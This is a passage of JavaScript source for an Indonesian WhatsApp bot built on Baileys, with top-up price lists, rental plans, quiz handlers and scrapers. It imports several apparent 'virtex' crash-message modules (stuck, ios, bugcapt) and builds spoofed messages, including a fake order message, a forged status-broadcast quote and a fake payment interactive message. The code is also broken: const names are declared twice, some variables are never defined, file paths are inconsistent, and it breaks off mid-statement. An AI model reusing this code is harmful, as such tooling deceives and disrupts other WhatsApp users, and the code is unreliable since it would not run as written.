require('./all/settings')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require("@whiskeysockets/baileys")
require("./all/global")
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, formatp,
googleTTS ,parseMention, getRandom, getGroupAdmins } = require('./all/myfunc')

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const moment = require('moment-timezone')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./scrape/uploader')
const speed = require('performance-now')
const hx = require('hxz-api')
const fdl = require("caliph-api")
const { JSDOM } = require('jsdom')
const { apikey } = require('./apikey.json')
const { Configuration, OpenAIApi } = require("openai");
const { fetchBuffer, buffergif } = require("./lib/myfunc2")
const githubstalk = require('./scrape/githubstalk')
const npmstalk = require('./scrape/npmstalk')
let qwer = require("./key.json")
const { color, bgcolor } = require('./all/color')
const { uptotelegra } = require('./all/upload')
const { ytDonlodMp3, ytDonlodMp4, ytPlayMp3, ytPlayMp4, ytSearch } = require('./scrape/yt')
const ytdl = require("ytdl-core")
const { dateDatabase } = require('./lib/functions.js')
const { msgFilter } = require('./lib/antispam')
const { premium } = require('./lib/premium')
const { toAudio, toPTT, toVideo,}= require('./lib/converter')
const { buttonkal } = require('./baseikal/virtex/buttonkal')
const { ngazap } = require('./baseikal/virtex/ngazap')
const { cttl } = require('./baseikal/virtex/cttl')
const { tizi } = require('./baseikal/virtex/tizi')
const { weg } = require('./baseikal/virtex/weg')
const { virtex7 } = require('./baseikal/virtex/virtex7')
virgam = fs.readFileSync(`./baseikal/image/deden.jpeg`)
const { mdelay } = require('./zetszet/virtex/mdelay.js')
const { stuck1 } = require('./zetszet/virtex/stuck1.js')
const { stuck2 } = require('./zetszet/virtex/stuck2.js')
const { stuck3 } = require('./zetszet/virtex/stuck3.js')
const { ios1 } = require('./zetszet/virtex/ios1.js')
const { ios2 } = require('./zetszet/virtex/ios2.js')
const { zovcgay } = require('./zetszet/virtex/zovcgay.js')
const { zetxdgay } = require('./zetszet/virtex/zetxdgay.js')
const { bugcapt } = require('./zetszet/virtex/bugcapt.js')
const { Client: WAWebClient, MessageType } = require('whatsapp-web.js');
const testimoni = JSON.parse(fs.readFileSync('./database/testimoni.json'))
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const thumb = fs.readFileSync ('./thumb.png')
const ntnsfw = JSON.parse(fs.readFileSync('./all/database/nsfw.json'))
const pengguna = JSON.parse(fs.readFileSync('./all/database/owner.json'))
const isPremium = JSON.parse(fs.readFileSync('./database/premium.json'))
const isUser = pengguna.includes(m.sender)

module.exports = async (Biiofc, m, store) => {
try {
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '' //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime)
const isGroup = from.endsWith('@g.us')
const DigitalOcean = require('digitalocean');
const botNumber = await Biiofc.decodeJid(Biiofc.user.id)
const sender = m.key.fromMe ? (Biiofc.user.id.split(':')[0]+'@s.whatsapp.net' || Biiofc.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await Biiofc.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const validGrup=(id,array)=>{for(var i=0;i<array.length;i++){if(array[i]==id){return!0}}
return!1}
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false 
const API_TOKEN = global.apitokendo;
const LINODE_API_TOKEN = global.apilinode;
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const jam = moment.tz('asia/jakarta').format("HH:mm:ss");
const hariini = moment.tz("Asia/Jakarta").format("dddd, DD MMMM YYYY");
const ffstalk = require('./scrape/ffstalk')
const scp1 = require('./scrape/scraper') 
const { Client } = require('ssh2');
const dns = require('dns');
const { addSaldo, minSaldo, cekSaldo, cekKoinPerak } = require("./all/database/deposit");
const { status, order_id, number, SMS } = JSON.parse(fs.readFileSync("./freya/status.json"))
const yts = require('./scrape/yt-search')
const { ytSearch } = require('./scrape/yt')
const { remini } = require('./freya/remini')
const jsobfus = require('javascript-obfuscator')
const { mediafireDl } = require('./all/database/mediafire.js') 
const db_user = JSON.parse(fs.readFileSync('./freya/user.json'))
let db_saldo = JSON.parse(fs.readFileSync("./all/database/saldo.json"));
server = JSON.parse(fs.readFileSync('./database/server.json'))
const grups = JSON.parse(fs.readFileSync('./database/grups.json'))
const pengguna = JSON.parse(fs.readFileSync('./database/user.json'))
const pler = JSON.parse(fs.readFileSync('./all/database/idgrup.json').toString())
const jangan = m.isGroup ? pler.includes(m.chat) : false
const qtod = m.quoted? "true":"false"
    let cekUser = (satu, dua) => { 
let x1 = false
Object.keys(db_user).forEach((i) => {
if (db_user[i].id == dua){x1 = i}})
if (x1 !== false) {
if (satu == "id"){ return db_user[x1].id }
if (satu == "name"){ return db_user[x1].name }
if (satu == "seri"){ return db_user[x1].seri }
if (satu == "premium"){ return db_user[x1].premium }
}
if (x1 == false) { return null } 
}
//=================================================//
// read database
let tebaklagu = []
let _family100 = []
let kuismath =  []
let tebakgambar = []
let tebakkata = []
let caklontong = []
let caklontong_desk = []
let tebakkalimat = []
let tebaklirik = []
let tebaktebakan = []
//=================================================//

//sewainbot
let sewa = {
rizalxdzzdev1: { nama: "1 Hari", harga: 5000, id: "rizalxdzzdev1" },
rizalxdzzdev2: { nama: "3 HARI", harga: 15000, id: "rizalxdzzdev2" },
rizalxdzzdev3: { nama: "5 HARI", harga: 25000, id: "rizalxdzzdev3" },
rizalxdzzdev4: { nama: "7 HARI", harga: 45000, id: "rizalxdzzdev4" },
rizalxdzzdev5: { nama: "10 HARI", harga: 55000, id: "rizalxdzzdev5" },
rizalxdzzdev6: { nama: "14 HARI", harga: 65000, id: "rizalxdzzdev6" },
rizalxdzzdev7: { nama: "21 HARI", harga: 75000, id: "rizalxdzzdev7" },
rizalxdzzdev8: { nama: "30 HARI", harga: 85000, id: "rizalxdzzdev8" },
rizalxdzzdev9: { nama: "UNLIMITED", harga: 95000, id: "rizalxdzzdev10" },
};
// LIST GG RIZAL STORE GMG BROH AOWKWOWKW

   // *⫹⫺ ╳╶╼╶╶╶╶┈ ⎝ LIST MOBILELEGENDS ⎞ ┈╴╴╴╴╾╴╳ ⫹⫺*/
let ml = {
ML3: { nama: "MOBILELEGEND - 3 Diamond", harga: 1500, id: "ML3" },
ML5: { nama: "MOBILELEGEND - 5 Diamond", harga: 1700, id: "ML5" },
ML11: { nama: "MOBILELEGEND - 11 Diamond", harga: 2900, id: "ML11" },
ML10: { nama: "MOBILELEGEND - 10 Diamond", harga: 3000, id: "ML10" },
ML12: { nama: "MOBILELEGEND - 12 Diamond", harga: 3500, id: "ML12" },
ML14: { nama: "MOBILELEGEND - 14 Diamond", harga: 3600, id: "ML14" },
ML15: { nama: "MOBILELEGEND - 15 Diamond", harga: 4500, id: "ML15" },
ML17: { nama: "MOBILELEGEND - 17 Diamond", harga: 4700, id: "ML17" },
ML19: { nama: "MOBILELEGEND - 19 Diamond", harga: 5400, id: "ML19" },
ML22: { nama: "MOBILELEGEND - 22 Diamond", harga: 5500, id: "ML22" },
ML20: { nama: "MOBILELEGEND - 20 Diamond", harga: 6000, id: "ML20" },
ML28: { nama: "MOBILELEGEND - 28 Diamond", harga: 7000, id: "ML28" },
};
/*⫹⫺ ╳╶╼╶╶╶╶┈ ⎝ LIST DANA ⎞ ┈╴╴╴╴╾╴╳ ⫹⫺*/
let dana = { 
DANA1: { nama: "DANA 1.000", harga: 2000, id: "DANA1" },
DANA2: { nama: "DANA 2.000", harga: 3000, id: "DANA2" },
DANA3: { nama: "DANA 3.000", harga: 4000, id: "DANA3" },
DANA4: { nama: "DANA 4.000", harga: 5000, id: "DANA4" },
DANA5: { nama: "DANA 5.000", harga: 6000, id: "DANA5" },
DANA6: { nama: "DANA 6.000", harga: 7000, id: "DANA6" },
DANA7: { nama: "DANA 7.000", harga: 8000, id: "DANA7" },
DANA8: { nama: "DANA 8.000", harga: 9000, id: "DANA8" },
DANA9: { nama: "DANA 9.000", harga: 10000, id: "DANA9" },
DANA10: { nama: "DANA 10.000", harga: 11000, id: "DANA10" },
DANA11: { nama: "DANA 11.000", harga: 12000, id: "DANA11" },
DANA12: { nama: "DANA 12.000", harga: 13000, id: "DANA12" },
DANA13: { nama: "DANA 13.000", harga: 14000, id: "DANA13" },
DANA14: { nama: "DANA 14.000", harga: 15000, id: "DANA14" },
DANA15: { nama: "DANA 15.000", harga: 16000, id: "DANA15" },
};
/*⫹⫺ ╳╶╼╶╶╶╶┈ ⎝ LIST GOPAY ⎞ ┈╴╴╴╴╾╴╳ ⫹⫺*/
let gopay = {
GOPAY1: { nama: "SALDO GOPAY 1.000", harga: 2500, id: "GOPAY1" },
GOPAY2: { nama: "SALDO GOPAY 2.000", harga: 3500, id: "GOPAY2" },
GOPAY3: { nama: "SALDO GOPAY 3.000", harga: 4500, id: "GOPAY3" },
GOPAY4: { nama: "SALDO GOPAY 4.000", harga: 5500, id: "GOPAY4" },
GOPAY5: { nama: "SALDO GOPAY 5.000", harga: 6500, id: "GOPAY5" },
GOPAY6: { nama: "SALDO GOPAY 6.000", harga: 7500, id: "GOPAY6" },
GOPAY7: { nama: "SALDO GOPAY 7.000", harga: 8500, id: "GOPAY7" },
GOPAY8: { nama: "SALDO GOPAY 8.000", harga: 9500, id: "GOPAY8" },
GOPAY9: { nama: "SALDO GOPAY 9.000", harga: 10500, id: "GOPAY9" },
GOPAY10: { nama: "SALDO GOPAY 10.000", harga: 11500, id: "GOPAY10" },
};
/*⫹⫺ ╳╶╼╶╶╶╶┈ ⎝ LIST OVO ⎞ ┈╴╴╴╴╾╴╳ ⫹⫺*/
let ovo = {
OVO5: { nama: "SALDO OVO 5.000", harga: 6000, id: "OVO5" },
OVO10: { nama: "SALDO OVO 10.000", harga: 11500, id: "OVO10" },
OVO15: { nama: "SALDO OVO 15.000", harga: 16500, id: "OVO15" },
OVO20: { nama: "SALDO OVO 20.000", harga: 21500, id: "OVO20" },
OVO25: { nama: "SALDO OVO 25.000", harga: 26500, id: "OVO25" },
OVO30: { nama: "SALDO OVO 30.000", harga: 31500, id: "OVO30" },
};
/*⫹⫺ ╳╶╼╶╶╶╶┈ ⎝ LIST  PUBG MOBILE ⎞ ┈╴╴╴╴╾╴╳ ⫹⫺*/
let pubg = {
PUBG15: { nama: "PUBG MOBILE 15 UC", harga: 3000, id: "PUBG15" },
PUBG16: { nama: "PUBG MOBILE 16 UC", harga: 3200, id: "PUBG" },
PUBG25: { nama: "PUBG MOBILE 25 UC", harga: 4500, id: "PUBG" },
PUBG26: { nama: "PUBG MOBILE 26 UC", harga: 5200, id: "PUBG" },
};
/*⫹⫺ ╳╶╼╶╶╶╶┈ ⎝ LIST FREE FIRE ⎞ ┈╴╴╴╴╾╴╳ ⫹⫺*/
let ff = {
FF5: { nama: "5 Diamond Free Fire", harga: 1000, id: "FF5" },
FF10: { nama: "10 Diamond Free Fire", harga: 2000, id: "FF10" },
FF12: { nama: "12 Diamond Free Fire", harga: 2100, id: "FF12" },
FF15: { nama: "15 Diamond Free Fire", harga: 2500, id: "FF15" },
FF20: { nama: "20 Diamond Free Fire", harga: 3300, id: "FF20" },
FF25: { nama: "25 Diamond Free Fire", harga: 4000, id: "FF25" },
FF30: { nama: "30 Diamond Free Fire", harga: 5000, id: "FF30" },
FF40: { nama: "40 Diamond Free Fire", harga: 5555, id: "FF40" },
FF50: { nama: "50 Diamond Free Fire", harga: 6233, id: "FF50" },
FF55: { nama: "55 Diamond Free Fire", harga: 7000, id: "FF55" },
FF60: { nama: "60 Diamond Free Fire", harga: 7700, id: "FF60" },
FF70: { nama: "70 Diamond Free Fire", harga: 9000, id: "FF70" },
FF75: { nama: "75 Diamond", harga: 9300, id: "FF75" },
FF90: { nama: "90 Diamond", harga: 11500, id: "FF90" },
};

//setuser
let setUser = (satu, dua, tiga) => { 
Object.keys(db_user).forEach((i) => {
if (db_user[i].id == dua){
if (satu == "±id"){ db_user[i].id = tiga
fs.writeFileSync('./riza/user.json', JSON.stringify(db_user))} 
if (satu == "±name"){ db_user[i].name = tiga 
fs.writeFileSync('./rizal/user.json', JSON.stringify(db_user))} 
if (satu == "±seri"){ db_user[i].seri = tiga 
fs.writeFileSync('./rizal/user.json', JSON.stringify(db_user))} 
if (satu == "±premium"){ db_user[i].premium = tiga 
fs.writeFileSync('./rizal/user.json', JSON.stringify(db_user))}
}})
}
const checkIdSewa = (userId) => {
	const deppo = JSON.parse(fs.readFileSync(`./freya/sewa/${from}.json`))
    let status = false;
    Object.keys(deppo).forEach((i) => {
        if (deppo[i].id === userId) {
            status = true;
        }
    })
    return status
}
const checkRefSewa = (userId) => {
	const deppo = JSON.parse(fs.readFileSync(`./freya/sewa/${from}.json`))
    let status = ''
    Object.keys(deppo).forEach((i) => {
        if (deppo[i].id === userId) {
            status = deppo[i].ref
        }
    })
    return status
}
const checkStsSewa = (userId) => {
	const deppo = JSON.parse(fs.readFileSync(`./freya/sewa/${from}.json`))
    let status = ''
    Object.keys(deppo).forEach((i) => {
        if (deppo[i].id === userId) {
            status = deppo[i].status
        }
    })
    return status
}
//BanUser
const banUser = await Biiofc.fetchBlocklist

// Auto Blocked Nomor +212
if (m.sender.startsWith('212')) return Biiofc.updateBlockStatus(m.sender, 'block')

// Random Color
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]

// Command Yang Muncul Di Console
if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(namabot), color(`[ PESAN ]`, `${randomcolor}`), color(`FROM`, `${randomcolor}`), color(`${pushname}`, `${randomcolor}`), color(`Text :`, `${randomcolor}`), color(`${body}`, `white`))
}

//total fitur
const totalFitur = () =>{
            var mytext = fs.readFileSync("./appearance.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
        
// Database
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
const prem = JSON.parse(fs.readFileSync("./all/database/premium.json"))
const premm = JSON.parse(fs.readFileSync("./all/database/premiumm.json"))
const ownerNumber = JSON.parse(fs.readFileSync("./all/database/owner.json"))

// Cek Database
const isContacts = contacts.includes(sender)
const isPremium = prem.includes(sender)
const isPremiumm = premm.includes(sender)
const isOwner = ownerNumber.includes(senderNumber) || isBot
// Jangan Di Edit Tar Error
let list = []
for (let i of ownerNumber) {
list.push({
displayName: await Biiofc.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await Biiofc.getName(i + '@s.whatsapp.net')}\n
FN:${await Biiofc.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:tesheroku123@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://bit.ly/39Ivus6\n
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

//emote
const emote = (satu, dua) => {
try{	    
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
emoji.get(satu)
.then(emoji => {
Biiofc.sendMessage(from, { caption: mess.success, image: {url: emoji.images[dua].url} }, {quoted:m})
})
} catch (e) {
m.reply("Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji")
}
}

if (isMedia && m.key.fileSha256 && (m.key.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
userJid: Biiofc.user.id,
quoted : m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, Biiofc.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
Biiofc.ev.emit('messages.upsert', m.key)
}

// Push Message To Console && Auto Read
        if (m.message) {
            Biiofc.readMessages([m.key])
            console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
        }
	// reset limit every 12 hours
        let cron = require('node-cron')
        cron.schedule('00 12 * * *', () => {
            let user = Object.keys(global.db.data.users)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            for (let jid of user) global.db.data.users[jid].limit = limitUser
            console.log('Reseted Limit')
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })
//func makeid
const makeid = (length) => {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() *
    charactersLength));
    }
    return result
}
function randomNomor(min, max = null) {
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}
  }
      

   function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
 
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await Biiofc.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}

// Fake Resize
const fkethmb = await reSize(ppuser, 300, 300)

// Cuma Fake
const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": orid,
"thumbnail": img,
"itemCount": itcount,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": title,
"message": text,
"sellerJid": sellers,
"token": tokens,
"totalAmount1000": ammount,
"totalCurrencyCode": "IDR",
}
}), { userJid: jid, quoted: m })
Biiofc.relayMessage(jid, order.message, { messageId: order.key.id})
}

// Function Reply
const reply = (teks) => { 
Biiofc.sendMessage(from, { text: teks, contextInfo: { 
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb FERDYNESIA🚷`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://heylink.me/liyoffc/", 
"sourceUrl": "https://heylink.me/liyoffc/" }}}, { quoted: m }) } 

function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}

async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

// Pastikan Anda memiliki API token yang valid dari DigitalOcean dan disimpan dalam variabel API_TOKEN
const floc = {
    key: {
        participant: '0@s.whatsapp.net',
        ...(m.chat ? {
            remoteJid: `status@broadcast`
        } : {})
    },
    message: {
        locationMessage: {
            nama: `${namaCreator}`,
            jpegThumbnail: fkethmb,
        }
    }
}

const cap = 'HW MODS WA'
const kalgans = { 
key: {
fromMe: [], 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "0@s.whatsapp.net" } : {}) 
},

'message': {
	"interactiveMessage": {
						"header": {
						
							"hasMediaAttachment": [],
							"jpegThumbnail": thumb,
													},
						"nativeFlowMessage": {
							"buttons": [
								{
									"name": "review_and_pay",
									"buttonParamsJson": "{\"currency\":\"IDR\",\"external_payment_configurations\":[{\"uri\":\"\",\"type\":\"payment_instruction\",\"payment_instruction\":\"hey ini test\"}],\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":2500000,\"offset\":100},\"reference_id\":\"4MX98934S0D\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":2500000,\"offset\":100},\"items\":[{\"retailer_id\":\"6348642505244872\",\"product_id\":\"6348642505244872\",\"name\":\"FERDYNESIA\",\"amount\":{\"value\":2500000,\"offset\":100},\"quantity\":1}]}}"
								}
							]
			}
}}}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

//antispam kick
if (global.antispam) {
if (m.isGroup && m.message && msgFilter.isFiltered(from)) {

console.log(`${global.themeemoji}[SPAM]`, color(moment(m.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(m.pushName))

return await Biiofc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}

//=================================================//
if (('family100'+from in _family100) && isCmd) {
kuis = true
let room = _family100['family100'+from]
let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
if (!isSurender) {
 let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
 if (room.terjawab[index]) return !0
 room.terjawab[index] = m.sender
}
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
}).filter(v => v).join('\n')}
${isSurender ? '' : `Perfect Player`}`.trim()
Biiofc.sendText(from, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+from].pesan = mesg }).catch(_ => _)
if (isWin || isSurender) delete _family100['family100'+from]
}

if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
  Biiofc.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lagu`}, {quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = kuismath[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
 delete kuismath[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakgambar[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 Biiofc.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Gambar`}, {quoted:m})
 delete tebakgambar[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkata[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 Biiofc.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kata`}, {quoted:m})  
 delete tebakkata[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
deskripsi = caklontong_desk[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 Biiofc.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lontong 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 Biiofc.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kalimat`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklirik[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 Biiofc.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lirik`}, {quoted:m}) 
 delete tebaklirik[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
